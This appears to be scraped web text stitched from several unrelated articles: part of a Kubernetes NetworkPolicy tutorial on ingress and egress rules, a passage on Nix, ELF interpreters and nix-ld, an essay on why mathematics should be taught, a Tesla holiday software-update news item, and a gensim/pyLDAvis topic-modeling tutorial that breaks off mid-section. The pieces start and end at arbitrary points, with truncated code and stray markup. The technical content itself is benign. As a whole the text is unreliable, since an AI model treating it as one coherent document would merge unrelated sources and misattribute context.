&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ingress: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx</code></pre>



<p>There are 2 rules here. The first rule, called “ingress-access” will be applicable on pods that have the label app.kubernetes.io/name=ingress-nginx. Pods that match will allow traffic from 192.168.1.0/24. This IP range could be your local IP range if you’re using minikube, or a Virtual Private Cloud network range on cloud providers. In those ranges you typically run the LoadBalancer which needs access to the ingress controller. If you’re not using a cloud Load Balancer, then it can even be 0.0.0.0/0 in case you want to let everyone access your ingress controller.<br></p>



<p>Once traffic hits the ingress controller, it’ll proxy the requests to the backend services. We need to allow traffic between this ingress controller and the backend services, which can be done using the second NetworkPolicy, in our example “ingress-to-backends”. This rule matches the pods with the label “app=myapp”. You can make this a more generic label that you assign to all your backend pods. These pods need to allow traffic from the ingress controller, so we specify an “ingress” rule with “from” to match the namespace (ingress=true) and the pod with the label “app.kubernetes.io/name=ingress-nginx). Make sure to label the namespace where your ingress controller is running in to make this work. The end result should be something like this:</p>

<h2>Egress traffic</h2>



<p>Traffic originating from a pod will be controlled by the egress NetworkPolicy rules. The typical application will need to do DNS lookups (translating for example google.com to an IP address) before making a request to an external server. The DNS server typically runs within the Kubernetes cluster, so that’ll be the first rule you need when blocking all egress traffic. Below is an example of such a rule that blocks all egress traffic, but allows DNS traffic to the DNS pods running in the kube-system namespace (kube-system needs to be labelled with kube-dns: “true”):</p>



<pre><code><strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: deny-egress-allow-dns
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- <strong>Egress</strong>
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kube-dns: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;k8s-app: kube-dns
&nbsp;&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: UDP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53</code></pre>



<p>Once this Network Policy is in place, you’ll need to make sure you have an egress rule for every outgoing connection that any pod in the Kubernetes cluster can make. If an application uses for example an external API for transactional emails, or connects to external cloud services, then you’ll need a Network Policy covering this.</p>



<p>Most cloud services will have a list of IP addresses and IP ranges, which you can use to whitelist egress traffic. It can definitely be a long process to get it right if you have a lot of external dependencies. Once you deny all egress traffic by default, you’ll need to do some testing to trigger all the external endpoints and test whether they still work.</p>



<p>Below is an example rule to allow https (port 443) traffic to a specific IP address.</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;name: egress-access-myapp
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>cidr</strong>: 1.1.1.1/32
&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 443</code></pre>



<p>After applying this NetworkPolicy, the pod with the label app=myapp will be able to access hostnames that resolve to the IP address 1.1.1.1 (a CloudFlare IP) on port 443. This diagram summarizes our setup after applying both Network Policies:</p>

<p>This article shows you how to filter Layer 3 and 4 traffic using NetworkPolicies. Unfortunately at the time of writing, there’s no Layer 7 support in NetworkPolicies. To filter on http/https hostname or other protocols, we would need to redirect all the traffic through an egress proxy/gateway – which we’ll explain in another blog post!</p>

 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libruby-2.7.so.2.7]
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libc.so.6]
</code></pre></div></div>
<p>It requires two dynamic libraries <em>libruby</em> &amp; <em>libc</em>. These libraries may themselves have other dependencies, so we can use <strong>ldd</strong> to recursively find the dependency closure.</p>

<div><div><pre><code>❯ ldd <span>$(</span>which ruby<span>)</span>
    linux-vdso.so.1 <span>(</span>0x00007ffed1705000<span>)</span>

</code></pre></div></div>

<p>We can see here that <strong>ldd</strong> resolved the libraries to locations in my <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">Filesystem Hierarchy Standard</a>(FHS).</p>

<p>This is <em>not hermetic</em>, as the FHS is a global shared state across my machine.
This is the exact problem that Nix itself wants to address.</p>

<blockquote>
  <p>I’m on a Debian distro at the moment.</p>
</blockquote>

<p>Nix addresses this generally by patching the ELF header to <em>fully specify</em> where the shared libraries can be found in the <em>/nix/store</em>; so that they are not resolved or searched on the FHS.</p>

<div><div><pre><code>❯ readelf -d $(which ruby) | grep RUNPATH
 0x000000000000001d (RUNPATH) Library runpath:
 [/nix/store/z5lira1853d97gbmv1qbdjjpkjn7ksj8-ruby-2.6.6/lib:
 /nix/store/8fcxqg8dmwlkjw2vgkgz607kr5jy552w-zlib-1.2.11/lib:
 /nix/store/kah5n342wz4i0s9lz9ka4bgz91xa2i94-glibc-2.32/lib]
</code></pre></div></div>

<p>This <em>patching</em> however relies on the Nix <em>stdenv</em> derivation builder and ultimately is what makes binaries in Nix work.</p>

<blockquote>
  <p>Nix actually takes it a step further and patches the linker so that it does not even try to check the FHS.</p>
</blockquote>

<p>Binaries downloaded from the Internet are not patched. What can be done?</p>

<h2 id="interpreter">Interpreter</h2>

<p>A key insight into the bootstrapping of an ELF binary in Linux is the <em>interpreter</em>, whose presence is there to help satisfy any dynamic linkage.</p>

<p>Let’s take a look again at my non-Nix Ruby binary</p>

<div><div><pre><code>❯ readelf <span>-l</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>interpreter
      <span>[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre></div></div>

<blockquote>
  <p>Nix built binaries use a <a href="https://github.com/NixOS/patchelf">patchelf</a> utility that not only sets the <em>RUNPATH</em> to pin libraries but also changes the interpreter to one in the <em>/nix/store</em></p>
</blockquote>

<p>It is the interpreter’s goal to find the libraries listed in the ELF file either via the <em>RUNPATH</em>, <em>LD_LIBRARY_PATH</em> or the <em>FHS</em> well known directories.</p>

<p>⚠️ On NixOS <code>/lib64/ld-linux-x86-64.so.2</code> normally <strong>does not exist</strong> and as a result you will be greeted with an unfriendly <em>“bad ELF interpreter: No such file or directory”</em> error.</p>

<h2 id="nix-ld">nix-ld</h2>

<p>We have a binary that needs some shared libraries &amp; the bootstrapping process calls out to the interpreter set in the ELF header.</p>

<p>💡 Let’s put a <em>fake</em> interpreter on NixOS machines!</p>

<blockquote>
  <p>This idea works since the path of Linux <em>ld</em> is well known for each distribution.</p>
</blockquote>

<p>For instance, NixOS machines can place an entry at <em>/lib64/ld-linux-x86-64.so.2</em> for a custom binary that can help resolve dynamic libraries <strong>at runtime</strong> to libraries within the <em>/nix/store</em>.</p>

<p>This is in fact what <a href="https://github.com/Mic92">Mic92</a> has started with his project <a href="https://github.com/Mic92/nix-ld">nix-ld</a>.</p>

<p>How can our custom <em>ld</em> locate the necessary libraries though? This is where we can get really crazy. 🤪</p>

<p>We can use <a href="https://github.com/bennofs/nix-index">nix-index</a> – a files database for nixpkgs – to locate packages in Nix that provide the necessary library. 🤯</p>

<p>The packages can be realized on-demand onto the host and their <em>/nix/store</em> entry can then be included into the <em>LD_LIBRARY_PATH</em> environment variable set when handing off to the <em>real ld</em>.</p>

<blockquote>
  <p>If gc-roots are set for the required libraries, this determination can then be cached for a given binary.</p>
</blockquote>

<p>Fancier best-effort matching on picking packages that have the highest % of required symbols could also be done.</p>

<p>It seems kind of crazy that just picking random packages from the <em>nix-index</em> would ultimately let us run the binary; except that is how traditional software in Linux normally works! 😱</p>

<p>At worst it is providing the same experience users typically experience on non-NixOS distributions but giving a gentler onboarding for people as they see the Nix-light 😇</p>

<p><em>Revised October 23 based on comments on <a href="https://news.ycombinator.com/item?id=4679539">Hacker News</a> and <a href="http://www.reddit.com/r/math/comments/11sw82/the_unreasonable_ineffectiveness_of_mathematics/">Reddit</a>.</em></p>
<p>In American schools, mathematics is taught as a dark art. Learn these sacred methods and you will become master of the ancient symbols. You must memorize the techniques to our satisfaction or your performance on the state standardized exams will be so poor that they will be forced to lower the passing grades. Never mind the foundational principles, proofs, or derivations – you’ll learn those in due course.</p>
<p>Why? Why do math? Because you’ll <em>need</em> it, that’s why. You’ll use it in your physics classes. And I’m sure I can think of examples of how you’ll use math in “real life”, whatever your chosen career may be. Right? Right. I hear engineers have to know how to solve differential equations, for example, and before you can do differential equations you need to learn logarithms. So get back to chapter 14 and get working.</p>
<p>This is the message we’re giving our children, and it’s no wonder so few students develop an interest in mathematics. Ask any math major: Math isn’t about memorizing some formulas and learning how to factor polynomials. It’s… well, it’s something much deeper. It’s fascinating. But what is it exactly?</p>
<section id="rules-rules-rules">

<p>The universe appears to work on rules. Gravity tends to pull us to the Earth in the same way every day. Light has behaved exactly the same way for millions of years. Objects in motion tend to stay in motion unless acted upon by an external force. Magnets and electricity obey the same laws now as they did in the 1860s, when Maxwell discovered the laws.</p>
<p>Much of the human world obeys rules as well. Interest and fees accumulate in bank accounts according to rules set down in extremely small font on pieces of paper immediately discarded by account-holders. Internet traffic piles up in buffers and gets routed to its destination according to complicated sets of standards. Engine control modules execute millions of lines of code to read sensor data and process the driver’s instructions to keep pistons flailing in low-emissions synchrony. Aircraft autopilots use clever mathematical algorithms to decide how to keep long metal tubes with wings from falling out of the sky.</p>
<p>I could go on, but you get the idea. Many things follow predictable sets of rules. How can we precisely express these rules in a useful way?</p>
<p>We could use English (or Spanish, or whatever chosen language), but languages are notoriously ambiguous and tricky to work with. It would take many pages to precisely describe Maxwell’s equations of electrodynamics in English, and more importantly, the result would be impossible to work with.</p>
<p>After all, once the rules are set down you’d like to put them to use: make predictions about the behavior of reality, invent new devices, or calculate how many more boxes of ramen noodles you can afford before your paycheck arrives.</p>
<p>How do I move from <em>general</em> rules about the world to <em>specific</em> rules that describe what will happen in one particular situation? With rules written in English, I’m limited to one method:<a href="#fn1" id="fnref1"><sup>1</sup></a></p>
<ol type="1">
<li>Write down the rules and the situation.</li>
<li>Think very hard.</li>
<li>Write down the answer.</li>
</ol>
<p>There’s no system by which I manipulate a rule written in English and arrive at new facts about a specific situation. If I gave you a Monopoly rulebook, could you deduce the best properties to invest in, based on the expected likelihood of a player landing on each property? (If you must resort to written mathematics, you have proved my point.)</p>
<p>Rules aren’t useful if we can’t use them. Fortunately, we have mathematics.</p>
</section>
<section id="math-is-just-a-bunch-of-lego-bricks">

<p>Forget the mathematics you learned in school. Let’s think of mathematics in the abstract. Mathematics, at its most basic, is a very simple set of very well-defined rules. The rules describe the behavior and interaction of certain completely imaginary objects. Upon these rules, mathematicians have built others. By combining rules, mathematicians demonstrate certain facts about these imaginary objects: when certain objects are arranged in certain ways, the rules show they must have certain properties.</p>
<p>On top of all these rules mathematicians have built a universe. Inhabiting this universe are various objects – tensors, matrices, groups, Hilbert spaces, ordinary numbers, complex numbers, and so on and so forth – which are defined by mathematicians by the sets of rules they follow. Many of these rules are in fact defined in terms of combinations of much simpler rules. If a mathematician wishes to know how a certain mathematical object behaves under certain circumstances, he must simply apply the simple rules in creative ways to discover what <em>must</em> be true.</p>
<p>It’s much like being handed an extraordinarily large and complex Lego brick creation and figuring out what it does and how it works. Lego bricks are exceedingly simple, and you understand exactly how they work. The ungainly creation you’ve been given is made of Lego bricks, so you must simply take what you know about individual bricks and work out what happens when they’re put together. Soon enough you sort out what the stubby-looking bit on the left side does, and you no longer have to worry about the individual bricks: you just know that it’s a frobnulator, and now you understand how frobnulators work. Eventually, with much work, you can deduce what the entire machine does, and write down a set of rules describing its behavior. You can forget about the individual bricks and worry only about the entire creation.</p>
<p>Objects of mathematical construction are much the same, although they are much less painful to step on.<a href="#fn2" id="fnref2"><sup>2</sup></a></p>
</section>
<section id="glued-legos">

<p>High school mathematics doesn’t focus on the very basic rules and constructions of mathematics; they are very abstract, rigorously defined, and difficult to connect to physical reality. Our curriculum instead focuses on certain constructions that relate to reality. Geometry, for instance, is based on a very basic set of rules, but allows us to prove facts about real objects in three-dimensional space. A clever mathematician can wield the rules and basic facts to learn about all sorts of complicated shapes without ever leaving the two-dimensional world of a sheet of paper.</p>
<p>But that skill is not taught in high school. School mathematics is about memorizing the constructed mathematical objects, not learning how to wield the simple rules to build new objects and dissect their behavior.</p>
<p>High school mathematics, then, is much like being given a set of Lego airplanes which have been carefully glued together. You may learn how they work, but you do not have the tools to disassemble them and you haven’t the faintest idea how to build a new one. Should you ever meet these airplanes again, your knowledge will be useful; otherwise, what’s the point? It’s just like an 8th-grader complaining that he’ll never use the quadratic equation again in his life.</p>
<p>But what can you do with the basic rules of mathematics? Why do we care?</p>
<p>We’ve already discussed how many familiar parts of reality appear to follow rules. For many, like electromagnetism, we have no idea how the universe “knows” to follow these rules or why it must use these rules and not some other set. But we <em>can</em> construct complicated mathematical objects that in some ways are exactly analogous to physical objects. We can construct a mathematical object which represents an electric field, specify the rules it operates by, and use the rules to sort out what happens when a mathematical object representing an electron wanders by.</p>
<p>Or we could devise mathematical rules to represent the wobbling behavior of a plate spun and thrown in the air.<a href="#fn3" id="fnref3"><sup>3</sup></a></p>
<p>Or we could devise rules describing the grip of a car tire on a road surface in different atmospheric conditions.</p>
<p>Or rules describing how furniture can be arranged in the available space of your living room.</p>
<p>Or rules describing your retirement plan.</p>
<p>Or rules describing… well, anything you can think of that seems to follow rules. Perhaps mathematicians haven’t yet devised mathematical objects that behave in the right ways, or perhaps they have but do not understand how to manipulate them. Perhaps you can write down a set of rules but it’s so horribly complicated that it would take a computer years to determine what will happen ten seconds after you flip a switch. But the rules exist, and mathematics, one way or another, can probably describe them.</p>
<p>Some justify mathematics education as a way to teach students to think critically; that’s good, but they could also analyze essays and literature or study logic for that. We should not teach our students so they can be human calculators and perform simple arithmetic; that is important, but it is hardly the most useful part of mathematics.</p>
<p>We should teach our students mathematics because they can use it to describe reality. They can use it to discover facts about the universe. Facts about their retirement funds, their living rooms, and the rate of fish food consumption in their fish tanks.</p>
<p>Mathematics is a tool to explore reality. We should teach our students to use it.</p>

<p>Like every year, Tesla is preparing for a big software update for the upcoming holiday season 2020. CEO Elon Musk teased that the new software release is hot (fire icon), he said that in a stand alone tweet last night.</p>



<figure></figure>



<p>This time, Musk totally got rid of any details in his follow up tweets, leaving fans surprised about what new features or entertainment stuff is coming in the firmware version V11. “So many things you want &amp; some you didn’t know you wanted,” he added.</p>



<p>Tesla has been releasing a major set of features and Autopilot updates near the holiday season for the last two years. The Silicon Valley-based automaker rolled out the <a href="https://www.xautoworld.com/tesla/v10-software-review/" target="_blank" rel="noreferrer noopener">V10 Update last year</a> and <a href="https://www.xautoworld.com/tag/v9-update/" target="_blank" rel="noreferrer noopener">V9 in 2018</a>.</p>

<p>Now its time for a major software version release for 2020, which might include the new driving visualizations from <a href="https://www.teslaoracle.com/topic/autopilot/">FSD Beta</a>, new video games, and an advanced <a href="https://www.xautoworld.com/tesla/first-look-2018-easter-eggs/" target="_blank" rel="noreferrer noopener">Fart App</a> that Elon Musk hinted towards in the past saying “And, of course, your car will be able to fart (fart icon) in their general direction,” he said.</p>

<p>Elon Musk also released the following short video clip of a Tesla Model 3 conversing with its occupants, “Teslas will soon talk to people if you want. This is real,” he stated on Twitter earlier this year. He also said that these cars will be able to talk to pedestrians as well.</p>



<p>Musk hinted that the talking ability of Tesla cars using AI could also be coupled with the Sentry Mode, “This will make for some epic robber confusion,” he said.</p>

<p>Have you ever wanted to classify news, papers, or tweets based on their topics? Knowing how to do this can help you filter out irrelevant documents, and save time by reading only what you’re interested in.</p>



<p>That’s what text classification is for – allows you to train your model to recognize topics. This technique allows you to use data labels to train your model, and it’s supervised learning.</p>



<div><figure><img loading="lazy" width="461" height="200" src="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=461%2C200&amp;ssl=1" alt="text classification" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?w=461&amp;ssl=1 461w, https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=300%2C130&amp;ssl=1 300w" sizes="(max-width: 461px) 100vw, 461px" data-recalc-dims="1"></figure></div>



<p>In real life, you might not have data labels for text classification. You can go through each document to label them, or hire somebody else to do it, but that’s a lot of time and money, especially when you have more than 1000 data points.</p>



<p>Can you find the topics of your documents without training data? Yes, you can use topic modeling to do it.</p>






<h2>What is topic modeling?</h2>



<p>With <a href="https://towardsdatascience.com/end-to-end-topic-modeling-in-python-latent-dirichlet-allocation-lda-35ce4ed6b3e0" target="_blank" rel="noreferrer noopener nofollow">topic modeling</a>, you can cluster words for a set of documents. This is unsupervised learning, because it automatically groups words without a predefined list of labels.</p>



<p>If you feed the model data, it will give you different sets of words, and each set of words describes the topic.</p>



<pre>(<span>0</span>, <span>'0.024*</span><span>"ban"</span> + <span>0.017</span>*<span>"order"</span> + <span>0.015</span>*<span>"refugee"</span> + <span>0.015</span>*<span>"law"</span> + <span>0.013</span>*<span>"trump"</span> '
 <span>'+</span> <span>0.011</span>*<span>"kill"</span> + <span>0.011</span>*<span>"country"</span> + <span>0.010</span>*<span>"attack"</span> + <span>0.009</span>*<span>"state"</span> + '
 <span>'0.009*</span><span>"immigration"</span>')
(<span>1</span>, <span>'0.020*</span><span>"student"</span> + <span>0.020</span>*<span>"work"</span> + <span>0.019</span>*<span>"great"</span> + <span>0.017</span>*<span>"learn"</span> + '
  <span>'0.017*</span><span>"school"</span> + <span>0.015</span>*<span>"talk"</span> + <span>0.014</span>*<span>"support"</span> + <span>0.012</span>*<span>"community"</span> + '
  <span>'0.010*</span><span>"share"</span> + <span>0.009</span>*<span>"event"</span>)</pre>



<p>When you look at the first set of words, you would guess the topic is military and politics.&nbsp;Looking at the second set of words, you might guess the topic is public events, or school.</p>



<p>This is quite useful. Your texts are automatically categorized, without the need to label them!</p>






<h2>Visualize topic modeling with pyLDAvis</h2>



<p>Topic modeling is useful, but it’s difficult to understand it just by looking at a combination of words and numbers like above.</p>



<p>One of the most effective ways to understand data is through visualization. Is there a way that we can visualize the results of LDA? Yes, we can with<a href="https://github.com/bmabey/pyLDAvis" target="_blank" rel="noreferrer noopener nofollow"> pyLDAvis</a>.</p>



<p>PyLDAvis allows us to interpret the topics in a topic model like below:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis " srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=300%2C182&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Pretty cool, isn’t it? <strong>Now we will learn how to use topic modeling and pyLDAvis to categorize tweets and visualize the results. We’ll analyze </strong><a href="https://datapane.com/u/khuyentran1401/reports/tweets/" target="_blank" rel="noreferrer noopener nofollow"><strong>a real Twitter dataset containing 6000 tweets.</strong></a>&nbsp;</p>



<p>Let’s see what topics we can find.</p>



<figure></figure>






<h2>How to start with pyLDAvis and how to use it</h2>



<p>Install pyLDAvis with:</p>



<pre>pip install pyldavis</pre>



<p>The script to process the data can be found <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/ac75203d-2de0-4bbf-a559-ec7763d919d8/e7960ea4-c002-4ea6-949f-8964c1e33491" target="_blank" rel="noreferrer noopener nofollow">here</a>. Download the <a href="https://datapane.com/u/khuyentran1401/reports/processed_tweets/" target="_blank" rel="noreferrer noopener nofollow">data after being processed</a>.</p>



<p>Moving on, let’s import relevant libraries:</p>



<pre><span>import</span> gensim
<span>import</span> gensim.corpora <span>as</span> corpora
<span>from</span> gensim.corpora <span>import</span> Dictionary
<span>from</span> gensim.models.coherencemodel <span>import</span> CoherenceModel
<span>from</span> gensim.models.ldamodel <span>import</span> LdaModel

<span>from</span> pprint <span>import</span> pprint

<span>import</span> spacy

<span>import</span> pickle
<span>import</span> re 
<span>import</span> pyLDAvis
<span>import</span> pyLDAvis.gensim

<span>import</span> matplotlib.pyplot <span>as</span> plt 
<span>import</span> pandas <span>as</span> pd</pre>



<p>If you want to get access to the data above and follow along with the article, download the data and put the data in your current directory, then run:</p>



<pre>tweets = pd.read_csv(<span>'dp-export-8940.csv'</span>) 
tweets = tweets.Tweets.values.tolist()


tweets = [t.split(<span>','</span>) <span>for</span> t <span>in</span> tweets]</pre>






<h2>How to use LDA Model</h2>



<p>Topic modeling involves counting words and grouping similar word patterns to describe topics within the data. If the model knows the word frequency, and which words often appear in the same document, it will discover patterns that can group different words together.</p>



<p>We start with converting a collection of words to a bag of words, which is a list of tuples (word_id, word_frequency). <strong>gensim.corpora.Dictionary</strong> is a great tool for this:</p>



<pre>id2word = Dictionary(tweets)

corpus = [id2word.doc2bow(text) <span>for</span> text <span>in</span> tweets]
print(corpus[:<span>1</span>])

[[(<span>0</span>, <span>1</span>), (<span>1</span>, <span>1</span>), (<span>2</span>, <span>1</span>), (<span>3</span>, <span>3</span>), (<span>4</span>, <span>1</span>), (<span>5</span>, <span>2</span>), (<span>6</span>, <span>2</span>), (<span>7</span>, <span>1</span>), (<span>8</span>, <span>1</span>), (<span>9</span>, <span>1</span>), (<span>10</span>, <span>1</span>), (<span>11</span>, <span>2</span>), (<span>12</span>, <span>2</span>), (<span>13</span>, <span>1</span>), (<span>14</span>, <span>1</span>), (<span>15</span>, <span>1</span>), (<span>16</span>, <span>2</span>), (<span>17</span>, <span>1</span>), (<span>18</span>, <span>1</span>), (<span>19</span>, <span>1</span>), (<span>20</span>, <span>2</span>), (<span>21</span>, <span>1</span>), (<span>22</span>, <span>1</span>), (<span>23</span>, <span>1</span>), (<span>24</span>, <span>1</span>), (<span>25</span>, <span>2</span>), (<span>26</span>, <span>1</span>), (<span>27</span>, <span>1</span>), (<span>28</span>, <span>1</span>), (<span>29</span>, <span>1</span>), (<span>30</span>, <span>1</span>), (<span>31</span>, <span>1</span>), (<span>32</span>, <span>1</span>), ... , (<span>347</span>, <span>1</span>), (<span>348</span>, <span>1</span>), (<span>349</span>, <span>2</span>), (<span>350</span>, <span>1</span>), (<span>351</span>, <span>1</span>), (<span>352</span>, <span>1</span>), (<span>353</span>, <span>1</span>), (<span>354</span>, <span>1</span>), (<span>355</span>, <span>1</span>), (<span>356</span>, <span>1</span>), (<span>357</span>, <span>1</span>), (<span>358</span>, <span>1</span>), (<span>359</span>, <span>1</span>), (<span>360</span>, <span>1</span>), (<span>361</span>, <span>1</span>), (<span>362</span>, <span>2</span>), (<span>363</span>, <span>1</span>), (<span>364</span>, <span>4</span>), (<span>365</span>, <span>1</span>), (<span>366</span>, <span>1</span>), (<span>367</span>, <span>3</span>), (<span>368</span>, <span>1</span>), (<span>369</span>, <span>8</span>), (<span>370</span>, <span>1</span>), (<span>371</span>, <span>1</span>), (<span>372</span>, <span>1</span>), (<span>373</span>, <span>4</span>)]]</pre>



<p>What do these tuples mean? Let’s convert them into human readable format to understand:</p>



<pre>[[(id2word[i], freq) <span>for</span> i, freq <span>in</span> doc] <span>for</span> doc <span>in</span> corpus[:<span>1</span>]]

[[(<span>"'d"</span>, <span>1</span>),

  (<span>'add'</span>, <span>2</span>),
  (<span>'administrative'</span>, <span>1</span>),
  (<span>'affordable'</span>, <span>1</span>),
  (<span>'allow'</span>, <span>1</span>),
  (<span>'amazing'</span>, <span>1</span>),
...
  (<span>'way'</span>, <span>4</span>),
  (<span>'week'</span>, <span>1</span>),

  (<span>'writing'</span>, <span>1</span>),
  (<span>'wrong'</span>, <span>1</span>),
  (<span>'year'</span>, <span>4</span>)]]</pre>



<p>Now let’s build an LDA topic model. We will use <a href="https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel" target="_blank" rel="noreferrer noopener nofollow">gensim.models.ldamodel.LdaModel</a> for this:</p>



<pre>
lda_model = LdaModel(corpus=corpus,
                   id2word=id2word,
                   num_topics=<span>10</span>, 
                   random_state=<span>0</span>,
                   chunksize=<span>100</span>,
                   alpha=<span>'auto'</span>,
                   per_word_topics=<span>True</span>)

pprint(lda_model.print_topics())
doc_lda = lda_model[corpus]
</pre>



<p>There seem to be some <strong>patterns</strong> here. The first topic may be politics, and the second topic may be sport, but the pattern is not clear.</p>

</pre>



<p>Let’s use pyLDAvis to visualize the topics:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis visualization" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=300%2C182&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Click <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/Topic-modeling-b25db361-8995-42ee-bd50-6f03fa8d5847/65d94d91-43e9-4c21-bee6-8a9bf7584087#ldavis_el55571398076541038884947444595" target="_blank" rel="noreferrer noopener nofollow">here</a> to interact with the visualization yourself.</p>



<ul><li>Each bubble represents a topic. The larger the bubble, the higher percentage of the number of tweets in the corpus is about that topic.</li><li>Blue bars represent the overall frequency of each word in the corpus. If no topic is selected, the blue bars of the most frequently used words will be displayed.</li><li>Red bars give the estimated number of times a given term was generated by a given topic. As you can see from the image below, there are about 22,000 of the word ‘go’, and this term is used about 10,000 times within topic 1. The word with the longest red bar is the word that is used the most by the tweets belonging to that topic.</li></ul>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=596%2C648&amp;ssl=1" alt="PyLDAvis visualization" width="596" height="648" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?w=794&amp;ssl=1 794w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=276%2C300&amp;ssl=1 276w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=768%2C836&amp;ssl=1 768w" sizes="(max-width: 596px) 100vw, 596px" data-recalc-dims="1"></figure></div>



<ul><li>The further the bubbles are away from each other, the more different they are. For example, it is difficult to tell the difference between topics 1 and 2. They seem to be both about social life, but it is much easier to tell the difference between topics 1 and 3. We can tell that topic 3 is about politics.</li></ul>



<div><figure><img loading="lazy" width="613" height="651" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=613%2C651&amp;ssl=1" alt="pyLDAvis visualization" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?w=613&amp;ssl=1 613w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=282%2C300&amp;ssl=1 282w" sizes="(max-width: 613px) 100vw, 613px" data-recalc-dims="1"></figure></div>



<p>A good topic model will have big and non-overlapping bubbles scattered throughout the chart. As we can see from the graph, the bubbles are clustered within one place. Can we do better than this?</p>



<p>Yes, because luckily, there is a better model for topic modeling called LDA Mallet.</p>






<h2>How to use LDA Mallet Model</h2>



